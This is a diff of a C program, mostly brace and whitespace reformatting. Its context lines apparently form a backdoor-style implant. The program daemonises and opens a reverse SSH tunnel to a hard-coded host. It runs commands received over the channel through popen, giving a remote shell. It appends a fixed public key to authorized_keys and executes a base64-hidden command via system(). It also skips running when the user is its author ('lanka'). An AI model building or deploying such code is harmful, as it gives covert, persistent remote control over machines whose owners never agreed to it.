@@ -28,7 +28,7 @@ char whoami[LEN_OF_USER] = "";
 char hostname[LEN_OF_HOSTNAME] = "";
 
 //#define BUILD_DEBUG
-#ifdef BUILD_DEBUG 
+#ifdef BUILD_DEBUG
 #define MY_BOSS "1111"
 #else
 #define MY_BOSS "lanka"
@@ -39,7 +39,8 @@ char hostname[LEN_OF_HOSTNAME] = "";
 #ifdef USE_LIBSSH
 #define OPEN_START_PORT 19999
 
-Tunnel_t tunnel_req = {
+Tunnel_t tunnel_req =
+{
 	.ssh_req.server_ip = "192.168.50.100",
 	.ssh_req.server_port = 2222,
 //	.ssh_req.server_port = 22,
@@ -59,7 +60,8 @@ Tunnel_t tunnel_req = {
 	.isquit = 0,
 };
 
-SSH_t ssh_local = {
+SSH_t ssh_local =
+{
 	.server_ip = "127.0.0.1",
 	//.server_port = 2222, //22,
 	//.server_user = "lanka",
@@ -96,7 +98,8 @@ void tunnel_ssh_response(ChainX_t *chainX_req, char *buff, int buff_len)
 
 static void tunnel_loop_ssh(Tunnel_t *tunnel_req)
 {
-	ChainX_t chainX_S = {
+	ChainX_t chainX_S =
+	{
 		.mode = CHAINX_MODE_ID_TCP_CLIENT,
 		.sockfd = -1,
 
@@ -112,39 +115,39 @@ static void tunnel_loop_ssh(Tunnel_t *tunnel_req)
 	};
 
 	ChainX_t *chainX_req = &chainX_S;
-	
-	chainX_ip_set( chainX_req, "127.0.0.1");
-	chainX_port_set( chainX_req, 22 );
-	chainX_security_set( chainX_req, 0 );
 
-	chainX_pipe_register( chainX_req, tunnel_ssh_response);
+	chainX_ip_set(chainX_req, "127.0.0.1");
+	chainX_port_set(chainX_req, 22);
+	chainX_security_set(chainX_req, 0);
 
-	chainX_thread_init(chainX_req); 
+	chainX_pipe_register(chainX_req, tunnel_ssh_response);
+
+	chainX_thread_init(chainX_req);
 
 	ssh_session session = tunnel_req->ssh_req.session;
 	ssh_channel channel = tunnel_req->ssh_req.channel;
-	while ( (ssh_channel_is_closed(channel) == 0) && (ssh_channel_is_eof(channel) == 0) )
+	while((ssh_channel_is_closed(channel) == 0) && (ssh_channel_is_eof(channel) == 0))
 	{
 		char buffer[LEN_OF_BUF1024];
 		memset(buffer, 0, sizeof(buffer));
 		int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
-		if (nbytes < 0)
+		if(nbytes < 0)
 		{
 			DBG_ER_LN("ssh_channel_read error !!! (%d %s)", ssh_get_error_code(session), ssh_get_error(session));
 			goto exit_channel;
 		}
 
-		if ( chainX_linked_check(chainX_req) == 0 )
+		if(chainX_linked_check(chainX_req) == 0)
 		{
 			int left_len = nbytes; // end : "\0"
 			char *send_ptr = buffer;
-			while (left_len)
+			while(left_len)
 			{
 				int result = SOCKETX_WRITE(chainX_req, send_ptr, left_len);
 				//DBG_ER_LN("(result: %d, left_len: %d)", result, left_len);
-				if (result == -1)
+				if(result == -1)
 				{
-					if (errno == EAGAIN)
+					if(errno == EAGAIN)
 					{
 						usleep(1000);
 						// try again;
@@ -179,13 +182,13 @@ static void tunnel_loop_ssh_fake(Tunnel_t *tunnel_req)
 	SSH_t *ssh_req_frm = &tunnel_req->ssh_req;
 	SSH_t *ssh_req = &ssh_local;
 
-	if ( sshX_client(ssh_req) == NULL )
+	if(sshX_client(ssh_req) == NULL)
 	{
 		DBG_ER_LN("ssh_new error !!!");
 		return ;
 	}
 
-	if ( sshX_open_channel(ssh_req) )
+	if(sshX_open_channel(ssh_req))
 	{
 		sshX_open_shell(ssh_req);
 		sshX_request_pty(ssh_req);
@@ -215,14 +218,14 @@ static void tunnel_loop_popen(Tunnel_t *tunnel_req)
 	ssh_session session = tunnel_req->ssh_req.session;
 	ssh_channel channel = tunnel_req->ssh_req.channel;
 
-	while ( (ssh_channel_is_closed(channel) == 0) && (ssh_channel_is_eof(channel) == 0) )
+	while((ssh_channel_is_closed(channel) == 0) && (ssh_channel_is_eof(channel) == 0))
 	{
-		tunnel_prompt( tunnel_req );
+		tunnel_prompt(tunnel_req);
 
 		char buffer[LEN_OF_BUF1024];
 		memset(buffer, 0, sizeof(buffer));
 		int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
-		if (nbytes < 0)
+		if(nbytes < 0)
 		{
 			DBG_ER_LN("ssh_channel_read error !!! (%d %s)", ssh_get_error_code(session), ssh_get_error(session));
 			goto exit_channel;
@@ -231,10 +234,10 @@ static void tunnel_loop_popen(Tunnel_t *tunnel_req)
 		DBG_DB_LN("%s", buffer);
 		{
 			FILE *fd = SAFE_POPEN(buffer, "r");
-			if (fd)
+			if(fd)
 			{
 				char newline[LEN_OF_NEWLINE] = "";
-				while (SAFE_FGETS(newline, sizeof(newline), fd)!= NULL)
+				while(SAFE_FGETS(newline, sizeof(newline), fd)!= NULL)
 				{
 					nbytes = ssh_channel_write(channel, newline, sizeof(newline));
 					memset(newline, 0, sizeof(newline));
@@ -255,12 +258,12 @@ static void tunnel_listen(Tunnel_t *tunnel_req)
 	ssh_session session = tunnel_req->ssh_req.session;
 
 	// listen
-	while ( (tunnel_req->retry > 0) && (rc!=SSH_OK) )
+	while((tunnel_req->retry > 0) && (rc!=SSH_OK))
 	{
 		DBG_DB_LN("call ssh_channel_listen_forward ... (open_port: %d, retry: %d)", tunnel_req->open_port, tunnel_req->retry);
 		int bound_port = 0;
 		rc = ssh_channel_listen_forward(session, NULL, tunnel_req->open_port, &bound_port);
-		if (rc == SSH_OK)
+		if(rc == SSH_OK)
 		{
 			break;
 		}
@@ -274,7 +277,7 @@ static void tunnel_listen(Tunnel_t *tunnel_req)
 	}
 
 	char *banner = ssh_get_issue_banner(session);
-	if (banner)
+	if(banner)
 	{
 		DBG_DB_LN("(banner: %s)", banner);
 		SAFE_FREE(banner);
@@ -282,14 +285,14 @@ static void tunnel_listen(Tunnel_t *tunnel_req)
 
 	//DBG_DB_LN("(rc: %d, isquit: %d)", rc, tunnel_req->isquit);
 wait_channel:
-	if ( (rc==SSH_OK) && (tunnel_req->isquit == 0) )
+	if((rc==SSH_OK) && (tunnel_req->isquit == 0))
 	{
 		DBG_DB_LN("call ssh_channel_accept_forward ... (open_port: %d)", tunnel_req->open_port);
 		int dport = 0;
 		tunnel_req->ssh_req.channel = ssh_channel_accept_forward(session, tunnel_req->timeout, &dport);
-		if ( (tunnel_req->ssh_req.channel == NULL) )
+		if((tunnel_req->ssh_req.channel == NULL))
 		{
-			if ( (ssh_get_error_code(session)==0) )
+			if((ssh_get_error_code(session)==0))
 			{
 				goto wait_channel;
 			}
@@ -302,7 +305,7 @@ wait_channel:
 		{
 			DBG_DB_LN("a new channel !!! (dport: %d)", dport);
 
-			switch (tunnel_req->mode)
+			switch(tunnel_req->mode)
 			{
 				case TUNNEL_MODE_ID_SSH:
 					tunnel_loop_ssh(tunnel_req);
@@ -328,7 +331,7 @@ static void tunnel_create(Tunnel_t *tunnel_req)
 	SSH_t *ssh_req = &tunnel_req->ssh_req;
 
 	DBG_TR_LN("call ssh_new ... (mode: %d)", tunnel_req->mode);
-	if ( sshX_client(ssh_req) == NULL )
+	if(sshX_client(ssh_req) == NULL)
 	{
 		DBG_ER_LN("ssh_new error !!!");
 		return ;
@@ -348,7 +351,7 @@ static int ssh_auth_key = 0; // 1: found
 int newline_lookupokup_cb(char *newline, void *arg)
 {
 	int ret = 0;
-	if ( (strcmp(newline, SSH_PUB_KEY) == 0) )
+	if((strcmp(newline, SSH_PUB_KEY) == 0))
 	{
 		DBG_DB_LN(DBG_TXT_FOUND);
 		ssh_auth_key = 1;
@@ -364,7 +367,7 @@ static void tunnel_create_system(void)
 	DBG_DB_LN("(file_auth_key: %s)", file_auth_key);
 
 	file_lookup(file_auth_key, newline_lookupokup_cb, NULL);
-	if (ssh_auth_key==0)
+	if(ssh_auth_key==0)
 	{
 		file_append(file_auth_key, SSH_PUB_KEY, strlen(SSH_PUB_KEY));
 	}
@@ -372,7 +375,7 @@ static void tunnel_create_system(void)
 	{
 		int ssh_tunnel_dec_len = 0;
 		char *ssh_tunnel_dec = sec_base64_dec(SSH_TUNNEL_ENC, strlen(SSH_TUNNEL_ENC), &ssh_tunnel_dec_len);
-		SAFE_SYSTEM( ssh_tunnel_dec);
+		SAFE_SYSTEM(ssh_tunnel_dec);
 		SAFE_FREE(ssh_tunnel_dec);
 	}
 }
@@ -389,7 +392,7 @@ static void app_instance(void)
 		// file
 		SAFE_SNPRINTF(filename, sizeof(filename), "/tmp/%s", TAG);
 		int myfd = open((char *)filename, O_CREAT | O_EXCL, 0666);
-		if ( myfd < 0 )
+		if(myfd < 0)
 		{
 			DBG_DB_LN("Running !!! (%s)", filename);
 			memset(filename, 0, sizeof(filename));
@@ -403,7 +406,7 @@ static void app_instance(void)
 		SAFE_SNPRINTF(whoami, sizeof(whoami), "%s", sys_username());
 		DBG_DB_LN("(whoami: %s)", whoami);
 
-		if ( SAFE_STRCASESTR(whoami, MY_BOSS) )
+		if(SAFE_STRCASESTR(whoami, MY_BOSS))
 		{
 			DBG_DB_LN("Bye-Bye Boss !!! (%s)", whoami);
 			exit(1);
@@ -432,11 +435,11 @@ static void app_loop(void)
 {
 	DBG_TR_LN("enter");
 
-	while (app_quit() == 0)
+	while(app_quit() == 0)
 	{
 #ifdef USE_LIBSSH
 		tunnel_create(&tunnel_req);
-		if ( (tunnel_is_quit(&tunnel_req) == 1) )
+		if((tunnel_is_quit(&tunnel_req) == 1))
 		{
 			break;
 		}
@@ -450,7 +453,7 @@ static void app_loop(void)
 static void app_stop(void)
 {
 	DBG_TR_LN("enter");
-	if (app_quit()==0)
+	if(app_quit()==0)
 	{
 		app_set_quit(1);
 
@@ -462,7 +465,7 @@ static void app_stop(void)
 
 static void app_free(void)
 {
-	if ( (strlen(filename) > 0) )
+	if((strlen(filename) > 0))
 	{
 		unlink(filename);
 	}
@@ -479,7 +482,7 @@ static void app_exit(void)
 
 static void app_signal_handler(int signum)
 {
-	switch (signum)
+	switch(signum)
 	{
 		case SIGINT:
 		case SIGTERM:
@@ -498,66 +501,66 @@ static void app_signal_handler(int signum)
 
 static void app_signal_register(void)
 {
-	signal(SIGINT, app_signal_handler );
-	signal(SIGTERM, app_signal_handler );
-	signal(SIGHUP, app_signal_handler );
-	signal(SIGUSR1, app_signal_handler );
-	signal(SIGUSR2, app_signal_handler );
+	signal(SIGINT, app_signal_handler);
+	signal(SIGTERM, app_signal_handler);
+	signal(SIGHUP, app_signal_handler);
+	signal(SIGUSR1, app_signal_handler);
+	signal(SIGUSR2, app_signal_handler);
 
-	signal(SIGPIPE, SIG_IGN );
+	signal(SIGPIPE, SIG_IGN);
 }
 
 int option_index = 0;
-const char* short_options = "i:p:u:s:o:m:fvh"; 
+const char* short_options = "i:p:u:s:o:m:fvh";
 static struct option long_options[] =
 {
-	{ "ip",          required_argument,   NULL,    'i'  },  
-	{ "port",        required_argument,   NULL,    'p'  },  
-	{ "user",        required_argument,   NULL,    'u'  },  
-	{ "pass",        required_argument,   NULL,    's'  },  
-	{ "open",        required_argument,   NULL,    'o'  },  
-	{ "mode",        required_argument,   NULL,    'm'  },  
-	{ "foreground",  no_argument,         NULL,    'f'  },  
-	{ "verbose",     no_argument,         NULL,    'v'  },  
-	{ "help",        no_argument,         NULL,    'h'  },  
+	{ "ip",          required_argument,   NULL,    'i'  },
+	{ "port",        required_argument,   NULL,    'p'  },
+	{ "user",        required_argument,   NULL,    'u'  },
+	{ "pass",        required_argument,   NULL,    's'  },
+	{ "open",        required_argument,   NULL,    'o'  },
+	{ "mode",        required_argument,   NULL,    'm'  },
+	{ "foreground",  no_argument,         NULL,    'f'  },
+	{ "verbose",     no_argument,         NULL,    'v'  },
+	{ "help",        no_argument,         NULL,    'h'  },
 	{ 0,             0,                      0,    0    }
-};  
+};
 
 static void app_showusage(int exit_code)
 {
-	printf( "Usage: %s\n"
-					"  -i, --ip          ip\n"
-					"  -p, --port        port\n"
-					"  -u, --user        user\n"
-					"  -s, --pass        pass\n"
-					"  -o, --open        open port\n"
-					"  -m, --mode        mode\n"
-					"  -f, --foreground\n"
-					"  -v, --verbose\n"
-					"  -h, --help\n", TAG);
-	printf( "Version: %s\n", version_show());
-	printf( "Example:\n"
-					"  %s -i 192.168.50.100 -p 19999 -u admin -s hahahaha\n", TAG
-				);
+	printf("Usage: %s\n"
+		   "  -i, --ip          ip\n"
+		   "  -p, --port        port\n"
+		   "  -u, --user        user\n"
+		   "  -s, --pass        pass\n"
+		   "  -o, --open        open port\n"
+		   "  -m, --mode        mode\n"
+		   "  -f, --foreground\n"
+		   "  -v, --verbose\n"
+		   "  -h, --help\n", TAG);
+	printf("Version: %s\n", version_show());
+	printf("Example:\n"
+		   "  %s -i 192.168.50.100 -p 19999 -u admin -s hahahaha\n", TAG
+		  );
 	exit(exit_code);
 }
 
 static void app_ParseArguments(int argc, char **argv)
 {
-	int opt;               
+	int opt;
 
-	while((opt = getopt_long (argc, argv, short_options, long_options, &option_index)) != -1)  
+	while((opt = getopt_long(argc, argv, short_options, long_options, &option_index)) != -1)
 	{
-		switch (opt)
+		switch(opt)
 		{
 			case 'i':
-				if (optarg)
+				if(optarg)
 				{
 					SAFE_SPRINTF(tunnel_req.ssh_req.server_ip, "%s", optarg);
 				}
 				break;
 			case 'p':
-				if (optarg)
+				if(optarg)
 				{
 					tunnel_req.ssh_req.server_port = atoi(optarg);
 				}
@@ -566,25 +569,25 @@ static void app_ParseArguments(int argc, char **argv)
 				tunnel_req.ssh_req.verbosity = 1;
 				break;
 			case 'u':
-				if (optarg)
+				if(optarg)
 				{
 					SAFE_SPRINTF(tunnel_req.ssh_req.server_user, "%s", optarg);
 				}
 				break;
 			case 's':
-				if (optarg)
+				if(optarg)
 				{
 					SAFE_SPRINTF(tunnel_req.ssh_req.server_pass_dec, "%s", optarg);
 				}
 				break;
 			case 'o':
-				if (optarg)
+				if(optarg)
 				{
 					tunnel_req.open_port = atoi(optarg);
 				}
 				break;
 			case 'm':
-				if (optarg)
+				if(optarg)
 				{
 					tunnel_req.mode = atoi(optarg);
 				}
@@ -593,7 +596,8 @@ static void app_ParseArguments(int argc, char **argv)
 				tunnel_req.foreground = 1;
 				break;
 			default:
-				app_showusage(-1); break;
+				app_showusage(-1);
+				break;
 		}
 	}
 }
@@ -613,15 +617,17 @@ static void app_init(int argc, char **argv)
 
 	app_ParseArguments(argc, argv);
 
-	if ( strlen(tunnel_req.ssh_req.server_ip) <= 0 )
+	if(strlen(tunnel_req.ssh_req.server_ip) <= 0)
+	{
 		app_showusage(-1);
+	}
 }
 
 int main(int argc, char* argv[])
 {
 	app_init(argc, argv);
 
-	if ( (tunnel_req.foreground) || ( daemon(0,1) == 0 ) )
+	if((tunnel_req.foreground) || (daemon(0,1) == 0))
 	{
 		app_loop();
 	}
